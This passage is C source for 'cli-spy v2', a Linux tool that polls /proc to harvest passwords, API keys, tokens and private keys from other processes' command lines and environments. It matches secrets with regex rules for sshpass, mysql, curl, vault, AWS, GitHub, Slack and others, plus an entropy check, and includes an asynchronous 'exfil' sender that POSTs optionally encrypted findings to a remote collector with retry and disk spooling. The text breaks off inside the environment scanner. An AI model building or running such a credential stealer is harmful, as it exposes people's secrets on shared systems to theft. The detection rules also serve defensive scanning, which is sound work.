#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <math.h>
#include <netdb.h>
#include <pthread.h>
#include <regex.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>
#include "seal.h"

/*
 * cli-spy v2
 *
 * Changes from v1:
 *  - exfil is fully asynchronous: emit() seals + enqueues, a sender
 *    thread POSTs with backoff; the scan loop never touches the
 *    network. On shutdown, unsent findings drain for 8s, then spool
 *    to <outfile>.unsent when -o was given (0600, O_NOFOLLOW) and
 *    reload at next start. With default stdout output, unsent
 *    findings are memory-only and dropped with a stderr note: the
 *    tool never creates a file artifact the user did not ask for.
 *  - catch-all vetting: shared benign_value() rejects paths, $VARS,
 *    <placeholders>, @files, UUIDs, sha256:, ARNs and URLs for the
 *    generic flag rule and the entropy scanner.
 *  - entropy scanner is hex-aware (hash-length hex only ignored when
 *    the flag is not secret-related), checks class diversity and
 *    distinct-byte ratio, and evaluates space-form `--flag value`
 *    in addition to glued `--flag=value`.
 *  - rules loop regexec(): multiple secrets on one line all land.
 *  - new inline-keyval-secret catch-all (VAR=val / body password=x).
 *  - bin-scoped rules also match basenames of later argv tokens
 *    (covers sh -c 'curl -u a:b ...', env VAR=x curl ..., sudo).
 *  - docker/az -p rules require " login " context; curl --user=
 *    added; openssl env: no longer emitted (it captured the var
 *    NAME, not a secret); bearer header is icase, captures token.
 *  - local -o output is created 0600.
 *
 * build: cc -O2 -Wall -o cli-spy cli-spy.c seal.o tweetnacl.o -lpthread -lm
 *        (pthread is merged into libc on glibc >= 2.34; keep the flag
 *        for portability)
 */

#define MAX_CMD     (64 * 1024)
#define MAX_SECRET  1024
#define SEEN_BITS   18u
#define SEEN_SIZE   (1u << SEEN_BITS)
#define GRACE_SCANS 3u     /* rescan PIDs younger than this many sweeps */
#define PRUNE_EVERY 500u   /* sweeps between dead-PID pruning */
#define QUEUE_CAP   16384u /* max queued exfil blobs before dropping */

static volatile sig_atomic_t g_stop;

static long        opt_interval_ms = 10;
static int         opt_env, opt_redact, opt_once, opt_verbose;
static const char *opt_url;
static FILE       *out;

static uint64_t st_sweeps, st_scans, st_hits, st_drops;

/* ---------- seen-PID set: open addressing on (pid, birth sweep) ----------
 * Policy: a PID is scanned at first sight and rescanned while young
 * (covers the fork/exec window where cmdline is still the parent's,
 * the empty-cmdline exec gap, and argv-scrubbing tools' pre-scrub
 * window). Once established (>= GRACE_SCANS sweeps old) it is skipped
 * with a single hash lookup. Dead PIDs are pruned periodically so a
 * reused PID is treated as new. */

static uint32_t g_seen_pid[SEEN_SIZE];
static uint32_t g_seen_born[SEEN_SIZE];
static uint32_t g_seen_n;

static long seen_find(uint32_t pid)
{
    uint32_t h = (pid * 2654435769u) >> (32u - SEEN_BITS);
    while (g_seen_pid[h] && g_seen_pid[h] != pid)
        h = (h + 1) & (SEEN_SIZE - 1);
    return g_seen_pid[h] ? (long)h : -1;
}

static void seen_insert(uint32_t pid, uint32_t born)
{
    uint32_t h = (pid * 2654435769u) >> (32u - SEEN_BITS);
    while (g_seen_pid[h] && g_seen_pid[h] != pid)
        h = (h + 1) & (SEEN_SIZE - 1);
    if (!g_seen_pid[h]) { g_seen_pid[h] = pid; g_seen_n++; }
    g_seen_born[h] = born;
}

static void seen_clear(void)
{
    memset(g_seen_pid, 0, sizeof g_seen_pid);
    g_seen_n = 0;
}

static uint32_t g_prune_pid[SEEN_SIZE];
static uint32_t g_prune_born[SEEN_SIZE];

static void prune_seen(void)
{
    memset(g_prune_pid, 0, sizeof g_prune_pid);
    uint32_t n = 0;
    for (uint32_t i = 0; i < SEEN_SIZE; i++) {
        uint32_t pid = g_seen_pid[i];
        if (!pid) continue;
        if (kill(pid, 0) == 0 || errno == EPERM) {   /* alive */
            uint32_t h = (pid * 2654435769u) >> (32u - SEEN_BITS);
            while (g_prune_pid[h]) h = (h + 1) & (SEEN_SIZE - 1);
            g_prune_pid[h] = pid;
            g_prune_born[h] = g_seen_born[i];
            n++;
        }
    }
    memcpy(g_seen_pid, g_prune_pid, sizeof g_seen_pid);
    memcpy(g_seen_born, g_prune_born, sizeof g_seen_born);
    g_seen_n = n;
}

/* ---------- time ---------- */

static uint64_t now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static void iso_ts(uint64_t ms, char *buf, size_t n)
{
    time_t s = (time_t)(ms / 1000);
    struct tm tmv;
    gmtime_r(&s, &tmv);
    snprintf(buf, n, "%04d-%02d-%02dT%02d:%02d:%02d.%03uZ",
             tmv.tm_year + 1900, tmv.tm_mon + 1, tmv.tm_mday,
             tmv.tm_hour, tmv.tm_min, tmv.tm_sec, (unsigned)(ms % 1000));
}

/* ---------- uid -> name (own /etc/passwd parse; no NSS, static-safe) ---------- */

typedef struct { uid_t uid; char name[32]; } UEnt;
static UEnt g_users[512];
static size_t g_nusers;

static void load_users(void)
{
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return;
    char line[512];
    while (fgets(line, sizeof line, f) && g_nusers < 512) {
        char *c1 = strchr(line, ':');
        if (!c1) continue;
        char *c2 = strchr(c1 + 1, ':');
        if (!c2) continue;
        size_t nl = (size_t)(c1 - line);
        if (nl > 31) nl = 31;
        memcpy(g_users[g_nusers].name, line, nl);
        g_users[g_nusers].name[nl] = 0;
        g_users[g_nusers].uid = (uid_t)strtol(c2 + 1, NULL, 10);
        g_nusers++;
    }
    fclose(f);
}

static const char *uid_name(uid_t uid, char *fb, size_t n)
{
    for (size_t i = 0; i < g_nusers; i++)
        if (g_users[i].uid == uid) return g_users[i].name;
    snprintf(fb, n, "%u", (unsigned)uid);
    return fb;
}

/* ---------- helpers ---------- */

static size_t jesc(char *d, size_t cap, const char *s)
{
    size_t w = 0;
    for (; *s && w + 3 < cap; s++) {
        unsigned char c = (unsigned char)*s;
        if (c == '"' || c == '\\') { d[w++] = '\\'; d[w++] = (char)c; }
        else if (c < 0x20) d[w++] = '?';
        else d[w++] = (char)c;
    }
    d[w] = 0;
    return w;
}

static int contains(const char *s, size_t n, const char *needle)
{
    size_t m = strlen(needle);
    if (m > n) return 0;
    for (size_t i = 0; i + m <= n; i++)
        if (!memcmp(s + i, needle, m)) return 1;
    return 0;
}

static double shannon(const char *s, size_t n)
{
    size_t f[256] = {0};
    for (size_t i = 0; i < n; i++) f[(unsigned char)s[i]]++;
    double h = 0.0;
    for (int c = 0; c < 256; c++) {
        if (!f[c]) continue;
        double p = (double)f[c] / (double)n;
        h -= p * log2(p);
    }
    return h;
}

static void redact_str(const char *s, char *d, size_t cap)
{
    size_t n = strlen(s);
    if (n <= 8) { snprintf(d, cap, "********"); return; }
    snprintf(d, cap, "%.4s...%s", s, s + n - 2);
}

static int all_hex(const char *s, size_t n)
{
    for (size_t i = 0; i < n; i++)
        if (!isxdigit((unsigned char)s[i])) return 0;
    return 1;
}

static int class_diversity(const char *s, size_t n)
{
    int lo = 0, up = 0, dg = 0, sy = 0;
    for (size_t i = 0; i < n; i++) {
        unsigned char c = (unsigned char)s[i];
        if (islower(c)) lo = 1;
        else if (isupper(c)) up = 1;
        else if (isdigit(c)) dg = 1;
        else sy = 1;
    }
    return lo + up + dg + sy;
}

/* Structural veto for candidate secret values: things that are clearly
 * not inline secrets. Vendor-agnostic; only matches benign *shape*. */
static int benign_value(const char *v, size_t n)
{
    switch (v[0]) {
    case '/': case '~': case '.':    /* path / relative path */
    case '$':                        /* $VAR, ${VAR}, $(...) */
    case '@':                        /* curl @file syntax */
    case '{': case '[':              /* JSON blob */
    case '<':                        /* <placeholder> */
        return 1;
    }
    if (n == 36 && v[8] == '-' && v[13] == '-' &&
        v[18] == '-' && v[23] == '-') return 1;      /* uuid */
    if (n > 7 && !memcmp(v, "sha256:", 7)) return 1; /* pinned digest */
    if (n > 4 && !memcmp(v, "arn:", 4)) return 1;    /* AWS ARN */
    if (contains(v, n, "://")) return 1;             /* URL */
    return 0;
}

/* ---------- exfil: minimal plaintext HTTP POST (binary-safe) ---------- */

static int http_post(const char *url, const char *body, size_t blen)
{
    if (strncmp(url, "http://", 7) != 0) return -1;
    const char *h = url + 7;
    const char *slash = strchr(h, '/');
    const char *path = slash ? slash : "/";
    char host[256], port[8] = "80";
    size_t hl = slash ? (size_t)(slash - h) : strlen(h);
    const char *colon = memchr(h, ':', hl);
    if (colon) {
        size_t pl = hl - (size_t)(colon - h) - 1;
        if (pl >= sizeof port) return -1;
        memcpy(port, colon + 1, pl); port[pl] = 0;
        hl = (size_t)(colon - h);
    }
    if (!hl || hl >= sizeof host) return -1;
    memcpy(host, h, hl); host[hl] = 0;

    struct addrinfo hints, *res = NULL, *ai;
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port, &hints, &res) != 0) return -1;

    int fd = -1;
    for (ai = res; ai; ai = ai->ai_next) {
        fd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (fd < 0) continue;
        struct timeval tv = { 4, 0 };
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);
        if (connect(fd, ai->ai_addr, ai->ai_addrlen) == 0) break;
        close(fd); fd = -1;
    }
    freeaddrinfo(res);
    if (fd < 0) return -1;

    char hdr[1024];
    int hn = snprintf(hdr, sizeof hdr,
        "POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\n"
        "Content-Length: %zu\r\nConnection: close\r\n\r\n", path, host, blen);

    const char *bufs[2] = { hdr, body };
    size_t lens[2] = { (size_t)hn, blen };
    for (int b = 0; b < 2; b++) {
        size_t off = 0;
        while (off < lens[b]) {
            ssize_t w = send(fd, bufs[b] + off, lens[b] - off, 0);
            if (w <= 0) { close(fd); return -1; }
            off += (size_t)w;
        }
    }
    char drain[256];
    while (recv(fd, drain, sizeof drain, 0) > 0) { }
    close(fd);
    return 0;
}

/* ---------- async exfil: queue + sender thread + optional disk spool ----------
 * emit() never blocks on the network: findings are sealed (if keyed)
 * and appended to an in-memory queue. The sender thread POSTs in
 * order with exponential backoff. Spool policy: the spool path is
 * derived from -o as "<outfile>.unsent"; with the default stdout
 * output there is NO spool and unsent findings are memory-only,
 * dropped at shutdown with a stderr note. The tool never creates a
 * file artifact the user did not ask for. */

typedef struct QItem {
    struct QItem *next;
    size_t len;
    unsigned char data[];
} QItem;

static QItem         *q_head, *q_tail;
static unsigned       q_depth;
static pthread_mutex_t q_mu = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t  q_cv = PTHREAD_COND_INITIALIZER;
static pthread_t       q_tid;
static int             q_started;
static const char     *g_spool;        /* NULL unless -o + -u */

static void exfil_submit(const unsigned char *body, size_t blen)
{
    if (!q_started) return;
    QItem *it = malloc(sizeof *it + blen);
    if (!it) { st_drops++; return; }
    it->next = NULL;
    it->len = blen;
    memcpy(it->data, body, blen);
    pthread_mutex_lock(&q_mu);
    if (q_depth >= QUEUE_CAP) {
        st_drops++;
        free(it);
    } else {
        if (q_tail) q_tail->next = it; else q_head = it;
        q_tail = it;
        q_depth++;
        pthread_cond_signal(&q_cv);
    }
    pthread_mutex_unlock(&q_mu);
}

static void *sender_main(void *arg)
{
    (void)arg;
    unsigned backoff_ms = 200;
    for (;;) {
        pthread_mutex_lock(&q_mu);
        while (!q_head && !g_stop)
            pthread_cond_wait(&q_cv, &q_mu);
        if (!q_head && g_stop) { pthread_mutex_unlock(&q_mu); break; }
        QItem *it = q_head;              /* peek; pop only on success */
        pthread_mutex_unlock(&q_mu);
        if (!it) continue;

        if (http_post(opt_url, (const char *)it->data, it->len) == 0) {
            pthread_mutex_lock(&q_mu);
            q_head = it->next;
            if (!q_head) q_tail = NULL;
            q_depth--;
            pthread_mutex_unlock(&q_mu);
            free(it);
            backoff_ms = 200;
        } else {
            uint64_t wake = now_ms() + backoff_ms;
            struct timespec ts;
            ts.tv_sec = (time_t)(wake / 1000);
            ts.tv_nsec = (long)(wake % 1000) * 1000000L;
            pthread_mutex_lock(&q_mu);
            pthread_cond_timedwait(&q_cv, &q_mu, &ts);
            pthread_mutex_unlock(&q_mu);
            if (backoff_ms < 5000) backoff_ms *= 2;
            if (opt_verbose)
                fprintf(stderr, "cli-spy: exfil POST failed, %u queued\n",
                        q_depth);
        }
    }
    return NULL;
}

static void spool_load(void)
{
    if (!g_spool) return;
    FILE *f = fopen(g_spool, "rb");
    if (!f) return;
    for (;;) {
        unsigned char hdr[8];
        if (fread(hdr, 1, 8, f) != 8) break;
        uint64_t L = 0;
        for (int i = 0; i < 8; i++) L = (L << 8) | hdr[i];
        if (L == 0 || L > (1u << 20)) break;      /* sanity */
        unsigned char *buf = malloc(L);
        if (!buf) break;
        if (fread(buf, 1, L, f) != L) { free(buf); break; }
        exfil_submit(buf, L);
        free(buf);
    }
    fclose(f);
    unlink(g_spool);
    if (opt_verbose && q_depth)
        fprintf(stderr, "cli-spy: reloaded %u spooled findings\n", q_depth);
}

static void spool_save(void)
{
    if (!g_spool) return;
    pthread_mutex_lock(&q_mu);
    if (!q_head) { pthread_mutex_unlock(&q_mu); return; }
    int fd = open(g_spool,
                  O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC | O_NOFOLLOW,
                  0600);
    if (fd < 0) { pthread_mutex_unlock(&q_mu); return; }
    FILE *f = fdopen(fd, "wb");
    if (!f) { close(fd); pthread_mutex_unlock(&q_mu); return; }
    unsigned n = 0;
    for (QItem *it = q_head; it; it = it->next) {
        unsigned char hdr[8];
        uint64_t L = it->len;
        for (int i = 7; i >= 0; i--) { hdr[i] = (unsigned char)(L & 0xff); L >>= 8; }
        fwrite(hdr, 1, 8, f);
        fwrite(it->data, 1, it->len, f);
        n++;
    }
    fclose(f);
    pthread_mutex_unlock(&q_mu);
    if (opt_verbose)
        fprintf(stderr, "cli-spy: %u unsent findings spooled to %s\n",
                n, g_spool);
}

/* Drain briefly, then persist (only when -o was given) or drop. */
static void exfil_shutdown(void)
{
    if (!q_started) return;

    uint64_t deadline = now_ms() + 8000;
    for (;;) {
        pthread_mutex_lock(&q_mu);
        int empty = (q_head == NULL);
        pthread_cond_signal(&q_cv);
        pthread_mutex_unlock(&q_mu);
        if (empty || now_ms() >= deadline) break;
        struct timespec ts = { 0, 50 * 1000000L };
        nanosleep(&ts, NULL);
    }

    g_stop = 1;                             /* release the sender thread */
    pthread_mutex_lock(&q_mu);
    unsigned leftn = q_depth;
    pthread_cond_broadcast(&q_cv);
    pthread_mutex_unlock(&q_mu);

    if (!leftn) {
        pthread_join(q_tid, NULL);
    } else if (g_spool) {
        spool_save();
    } else {
        fprintf(stderr, "cli-spy: %u unsent findings dropped "
                "(collector unreachable; rerun with -o to enable spool)\n",
                leftn);
    }
    if (st_drops)
        fprintf(stderr, "cli-spy: exfil drops=%llu (queue cap %u)\n",
                (unsigned long long)st_drops, QUEUE_CAP);
}

/* ---------- findings store ---------- */

typedef struct {
    char *secret, *rule, *evidence, *user;
    long pid; uid_t uid; int conf;
    uint64_t first_ms, last_ms, count;
} Finding;

static Finding *g_f;
static size_t g_nf, g_cf;
static char g_jbuf[3 * MAX_CMD + 4096];

static void emit(long pid, uid_t uid, const char *rule, int conf,
                 const char *secret, const char *evidence)
{
    uint64_t now = now_ms();

    for (size_t i = 0; i < g_nf; i++) {
        if (!strcmp(g_f[i].secret, secret)) {
            g_f[i].count++;
            g_f[i].last_ms = now;
            st_hits++;
            return;                 /* known secret: count, don't re-log */
        }
    }
    if (g_nf == g_cf) {
        g_cf = g_cf ? g_cf * 2 : 64;
        g_f = realloc(g_f, g_cf * sizeof *g_f);
        if (!g_f) { perror("realloc"); exit(1); }
    }
    Finding *f = &g_f[g_nf++];
    memset(f, 0, sizeof *f);
    f->secret = strdup(secret);
    f->rule = strdup(rule);
    f->evidence = strdup(evidence);
    f->pid = pid; f->uid = uid; f->conf = conf;
    f->first_ms = f->last_ms = now; f->count = 1;
    st_hits++;

    char ts[80], ufb[24], secbuf[MAX_SECRET + 16];
    iso_ts(now, ts, sizeof ts);
    const char *uname = uid_name(uid, ufb, sizeof ufb);
    f->user = strdup(uname);
    const char *sec = secret;
    if (opt_redact) { redact_str(secret, secbuf, sizeof secbuf); sec = secbuf; }

    char *w = g_jbuf, *end = g_jbuf + sizeof g_jbuf;
    w += snprintf(w, (size_t)(end - w),
        "{\"ts\":\"%s\",\"pid\":%ld,\"uid\":%u,\"user\":\"",
        ts, pid, (unsigned)uid);
    w += jesc(w, (size_t)(end - w), uname);
    w += snprintf(w, (size_t)(end - w),
        "\",\"rule\":\"%s\",\"confidence\":%d,\"secret\":\"", rule, conf);
    w += jesc(w, (size_t)(end - w), sec);
    w += snprintf(w, (size_t)(end - w), "\",\"cmdline\":\"");
    w += jesc(w, (size_t)(end - w), evidence);
    w += snprintf(w, (size_t)(end - w), "\"}\n");

    size_t len = (size_t)(w - g_jbuf);
    fwrite(g_jbuf, 1, len, out);
    fflush(out);

    if (opt_url) {
        const unsigned char *body = (unsigned char *)g_jbuf;
        size_t blen = len;
        unsigned char *blob = NULL;
        if (seal_available() &&
            seal_blob((unsigned char *)g_jbuf, len, &blob, &blen) == 0)
            body = blob;
        exfil_submit(body, blen);   /* hand off; never blocks the sweep */
        free(blob);
    }
}

/* ---------- rules engine ---------- */

typedef struct {
    const char *name;
    int conf;
    const char *pattern;
    const char *bins[8];   /* bins[0]==NULL => any binary */
    const char *ctx;       /* NULL, or substring required in the line */
    int capture;           /* pmatch slot holding the secret; 0 = whole match */
    int icase;
    int vet;               /* reject captures matching benign_value() */
    regex_t re;
} Rule;

static Rule g_rules[] = {
    /* -- binary-scoped: real CLIs that accept secrets as arguments -- */
    { "sshpass-password", 98,
      "(^| )-p ([^ ]+)",
      { "sshpass", NULL }, NULL, 2, 0, 1, { 0 } },
    { "mysql-inline-password", 95,
      "(^| )(-p|--password=)([^ ]+)",
      { "mysql", "mariadb", "mysqldump", "mysqladmin", "mysqlshow", NULL },
      NULL, 3, 0, 1, { 0 } },
    { "curl-user-auth", 90,
      "(^| )(--user[= ]?|-u ?)([^ :]+:[^ ]+)",
      { "curl", NULL }, NULL, 3, 0, 1, { 0 } },
    { "creds-in-url", 90,
      "(https?|ftps?|postgres(ql)?|mysql|mariadb|mongodb(\\+srv)?|redis"
      "|amqps?|ldaps?|smtps?)://[^/ :@]+:[^@ ]+@",
      { NULL }, NULL, 0, 0, 0, { 0 } },
    { "curl-bearer-header", 88,
      "Authorization: Bearer ([A-Za-z0-9._~-]{8,})",
      { "curl", NULL }, NULL, 1, 1, 1, { 0 } },
    { "vault-token-flag", 95,
      "(^| )-token[= ]([^ ]+)",
      { "vault", NULL }, NULL, 2, 0, 1, { 0 } },
    { "vault-positional-token", 92,
      "login ([^ ]+)",
      { "vault", "consul", "nomad", NULL }, NULL, 1, 0, 1, { 0 } },
    { "aws-secret-access-key-flag", 95,
      "--secret-access-key[= ]([^ ]+)",
      { "aws", NULL }, NULL, 1, 0, 1, { 0 } },
    { "az-password-flag", 90,
      "(^| )-p ([^ ]+)",
      { "az", NULL }, " login ", 2, 0, 1, { 0 } },
    { "htpasswd-inline", 93,
      "(^| )-b[bcm]? .* ([^ ]+)( |$)",
      { "htpasswd", NULL }, NULL, 2, 0, 1, { 0 } },
    { "mosquitto-password", 92,
      "(^| )-P ([^ ]+)",
      { "mosquitto_pub", "mosquitto_sub", NULL }, NULL, 2, 0, 1, { 0 } },
    { "k6-token-flag", 90,
      "--token[= ]([^ ]+)",
      { "k6", NULL }, NULL, 1, 0, 1, { 0 } },
    { "openssl-pass-arg", 92,
      "-pass(in|out)? pass:([^ ]+)",
      { "openssl", NULL }, NULL, 2, 0, 1, { 0 } },
    { "docker-login-password", 96,
      "(^| )(--password|-p)[= ]([^ ]+)",
      { "docker", NULL }, " login ", 3, 0, 1, { 0 } },
    { "redis-cli-auth", 94,
      "(^| )-a ([^ ]+)",
      { "redis-cli", NULL }, NULL, 2, 0, 1, { 0 } },
    { "smbclient-user-pass", 92,
      "(^| )-U ?([^ %:]+[%][^ ]+)",
      { "smbclient", "rpcclient", "smbmap", NULL }, NULL, 2, 0, 1, { 0 } },
    { "twine-upload-password", 92,
      "(^| )(-p|--password)[= ]([^ ]+)",
      { "twine", NULL }, NULL, 3, 0, 1, { 0 } },
    { "inline-private-key", 97,
      "-----BEGIN [A-Z ]*PRIVATE KEY-----",
      { NULL }, NULL, 0, 0, 0, { 0 } },

    /* -- token formats (any binary) -- */
    { "aws-access-key", 95,
      "(AKIA|ASIA|ABIA|ACCA)[A-Z0-9]{16}",
      { NULL }, NULL, 0, 0, 0, { 0 } },
    { "github-token", 97,
      "gh[pousr]_[A-Za-z0-9]{30,}",
      { NULL }, NULL, 0, 0, 0, { 0 } },
    { "gitlab-token", 97,
      "glpat-[A-Za-z0-9_-]{20,}",
      { NULL }, NULL, 0, 0, 0, { 0 } },
    { "slack-token", 95,
      "xox[bapors]-[0-9A-Za-z-]{10,}",
      { NULL }, NULL, 0, 0, 0, { 0 } },
    { "openai-key", 85,
      "sk-(proj-)?[A-Za-z0-9_-]{20,}",
      { NULL }, NULL, 0, 0, 0, { 0 } },
    { "google-api-key", 95,
      "AIza[0-9A-Za-z_-]{35}",
      { NULL }, NULL, 0, 0, 0, { 0 } },
    { "stripe-key", 95,
      "[sr]k_(live|test)_[0-9A-Za-z]{16,}",
      { NULL }, NULL, 0, 0, 0, { 0 } },
    { "twilio-key", 90,
      "SK[0-9a-fA-F]{32}",
      { NULL }, NULL, 0, 0, 0, { 0 } },
    { "hvs-vault-token", 92,
      "hvs\\.[A-Za-z0-9_-]{20,}",
      { NULL }, NULL, 0, 0, 0, { 0 } },
    { "jwt", 90,
      "eyJ[A-Za-z0-9_-]{8,}\\.eyJ[A-Za-z0-9_-]{8,}\\.[A-Za-z0-9_-]{8,}",
      { NULL }, NULL, 0, 0, 0, { 0 } },

    /* -- generic catch-alls -- */
    { "generic-secret-flag", 75,
      "(^| )--?(pass|password|passwd|pwd|token|secret|secret[-_]?key"
      "|api[-_]?key|apikey|access[-_]?key|client[-_]?secret|auth[-_]?token"
      "|bearer|credentials?|passphrase|session[-_]?token|refresh[-_]?token"
      "|signing[-_]?key|encryption[-_]?key|webhook[-_]?secret|master[-_]?key)"
      "[= ]([^ ]+)",
      { NULL }, NULL, 3, 1, 1, { 0 } },
    { "inline-keyval-secret", 72,
      "(([A-Za-z_][A-Za-z0-9_]*)?(PASS|PASSWORD|PASSWD|PWD|TOKEN|SECRET"
      "|API[-_]?KEY|APIKEY|ACCESS[-_]?KEY|CLIENT[-_]?SECRET|AUTH[-_]?TOKEN)"
      "[A-Za-z0-9_]*)=([^ &;'\"]{6,})",
      { NULL }, NULL, 4, 1, 1, { 0 } },
};
#define NRULES (sizeof g_rules / sizeof g_rules[0])

/* env-var keys AND entropy flag-context share this; "session" added */
static regex_t g_envkey_re;

/* Match basename of ANY argv token, not just argv[0], so bin-scoped
 * rules still fire under `sh -c 'curl -u a:b ...'`, `sudo mysql -pX`,
 * `env VAR=x curl ...`, etc. joined is the NUL->space flattened cmdline. */
static int bin_ok(const Rule *r, const char *joined)
{
    if (!r->bins[0]) return 1;
    const char *p = joined;
    while (*p) {
        while (*p == ' ') p++;
        if (!*p) break;
        const char *e = strchr(p, ' ');
        if (!e) e = p + strlen(p);
        char tok[256];
        size_t tl = (size_t)(e - p);
        if (tl >= sizeof tok) tl = sizeof tok - 1;
        memcpy(tok, p, tl); tok[tl] = 0;
        const char *bn = strrchr(tok, '/');
        bn = bn ? bn + 1 : tok;
        for (int i = 0; r->bins[i]; i++)
            if (!strcmp(r->bins[i], bn)) return 1;
        p = (*e == ' ') ? e + 1 : e;
    }
    return 0;
}

/* Flags whose values are essentially never secrets: data payloads,
 * non-secret file paths, checksums, identifiers. Vendor-agnostic. */
static const char *g_flag_ignore[] = {
    "--data", "--data-raw", "--data-binary", "--data-urlencode",
    "--payload", "--body", "--header", "--cookie", "--form",
    "--json", "--message", "--comment", "--description",
    "--config", "--file", "--path", "--output", "--cacert",
    "--cert", "--key", "--kubeconfig", "--profile", "--region",
    "--zone", "--image", "--tag", "--namespace", "--checksum",
    "--sha256", "--md5", "--digest", "--hash", "--etag",
    "--commit", "--revision", "--id", "--uuid", "--role-arn",
    "--set", "--label", "--annotation",
    "-d", "-H", "-o", "-A", "-e",
    NULL
};

static int flag_is_secretish(const char *flag, size_t fl)
{
    char tmp[64];
    while (fl && *flag == '-') { flag++; fl--; }   /* strip dashes */
    if (!fl || fl >= sizeof tmp) return 0;
    memcpy(tmp, flag, fl);
    tmp[fl] = 0;
    return regexec(&g_envkey_re, tmp, 0, NULL, 0) == 0;
}

/* Hex-aware entropy decision.
 * Hex caps at 4.0 bits/byte, so hash-length hex (git SHAs, MD5s,
 * digests) is ignored ONLY when the flag isn't secret-related; a
 * 64-hex value under --token= is a very common vendor secret shape.
 * Non-hex needs >= 4.3 bits/byte, class diversity >= 2, and a
 * distinct-byte ratio >= 0.3 to weed out structured strings. */
static int entropy_verdict(const char *val, size_t vl,
                           const char *flag, size_t fl, int *conf_out)
{
    if (vl < 16 || vl > 600) return 0;
    if (benign_value(val, vl)) return 0;
    double h = shannon(val, vl);

    if (all_hex(val, vl)) {
        int hash_len = (vl == 32 || vl == 40 || vl == 64 || vl == 128);
        if (hash_len && !flag_is_secretish(flag, fl))
            return 0;                       /* checksum context */
        if (vl < 20 || h < 3.4) return 0;   /* hex ceiling is 4.0 */
    } else {
        if (h < 4.3) return 0;
        if (class_diversity(val, vl) < 2) return 0;
    }
    {
        size_t seen[256] = {0}, distinct = 0;
        for (size_t i = 0; i < vl; i++)
            if (!seen[(unsigned char)val[i]]++)
                distinct++;
        if ((double)distinct / (double)vl < 0.3) return 0;
    }
    int conf = 30 + (int)((h - 4.0) * 30.0);
    if (conf > 70) conf = 70;
    if (conf < 25) conf = 25;
    *conf_out = conf;
    return 1;
}

/* Handles both glued `--flag=value` and space-form `--flag value`
 * (lookahead one token). Values are vetted by entropy_verdict(). */
static void entropy_scan(const char *j, long pid, uid_t uid)
{
    const char *p = j;
    while (*p) {
        while (*p == ' ') p++;
        if (!*p) break;
        const char *e = strchr(p, ' ');
        if (!e) e = p + strlen(p);
        size_t len = (size_t)(e - p);
        if (p[0] == '-' && len >= 2) {
            const char *flag = p, *val = NULL;
            size_t fl = 0, vl = 0;
            const char *eq = memchr(p, '=', len);
            if (eq && eq - p >= 2 && eq - p <= 40) {
                fl = (size_t)(eq - p);
                val = eq + 1;
                vl = (size_t)(e - val);
            } else if (!eq) {
                fl = len;
                const char *np = (*e == ' ') ? e + 1 : NULL;
                if (np && np[0] && np[0] != '-') {
                    const char *ne = strchr(np, ' ');
                    if (!ne) ne = np + strlen(np);
                    val = np;
                    vl = (size_t)(ne - np);
                }
            }
            if (val) {
                int ign = 0;
                for (int k = 0; g_flag_ignore[k] && !ign; k++)
                    if (strlen(g_flag_ignore[k]) == fl &&
                        !memcmp(g_flag_ignore[k], flag, fl)) ign = 1;
                int conf = 0;
                if (!ign && entropy_verdict(val, vl, flag, fl, &conf)) {
                    char sec[MAX_SECRET + 1];
                    if (vl > MAX_SECRET) vl = MAX_SECRET;
                    memcpy(sec, val, vl); sec[vl] = 0;
                    emit(pid, uid, "high-entropy-arg", conf, sec, j);
                }
            }
        }
        p = (*e == ' ') ? e + 1 : e;
    }
}

/* Loops regexec() per rule: a line carrying two secrets (e.g.
 * -u user:pass plus a credentialed URL) now yields both. */
static void run_rules(const char *joined, long pid, uid_t uid)
{
    for (size_t i = 0; i < NRULES; i++) {
        Rule *r = &g_rules[i];
        if (!bin_ok(r, joined)) continue;
        if (r->ctx && !strstr(joined, r->ctx)) continue;
        regmatch_t pm[8];
        int nm = r->capture + 1;
        if (nm > 8) nm = 8;
        const char *cur = joined;
        int eflags = 0;
        while (regexec(&r->re, cur, (size_t)nm, pm, eflags) == 0) {
            regmatch_t m = pm[0];
            if (r->capture > 0 && r->capture < nm && pm[r->capture].rm_so != -1)
                m = pm[r->capture];
            size_t L = (size_t)(m.rm_eo - m.rm_so);
            if (L && L <= MAX_SECRET) {
                char sec[MAX_SECRET + 1];
                memcpy(sec, cur + m.rm_so, L);
                sec[L] = 0;
                char *s = sec;
                while (*s == ' ') s++;
                if (s[0] && s[1] &&             /* 1-char: scrub residue */
                    !(r->capture && s[0] == '-') &&  /* swallowed flag */
                    !(r->vet && benign_value(s, strlen(s))))
                    emit(pid, uid, r->name, r->conf, s, joined);
            }
            if (pm[0].rm_eo <= 0) break;        /* zero-length guard */
            cur += pm[0].rm_eo;
            eflags = REG_NOTBOL;                /* ^ must not re-anchor */
        }
    }
    entropy_scan(joined, pid, uid);
}

/* ---------- /proc readers ---------- */

static char *key_evidence(const char *key)
{
    static char eb[128];
    snprintf(eb, sizeof eb, "env:%s", key);
    return eb;
}

static void scan_env(long pid, uid_t uid)
{
    char path[64];
    snprintf(path, sizeof path, "/proc/%ld/environ", pid);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return;
    static char buf[MAX_CMD];
    ssize_t n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n <= 0) return;
    buf[n] = 0;

    size_t i = 0;
    while (i < (size_t)n) {
        size_t len = strnlen(buf + i, (size_t)n - i);
        if (!len) { i++; continue; }
        char *entry = buf + i;
        char *eq = strchr(entry, '=');
        if (eq && eq != entry) {
            *eq = 0;
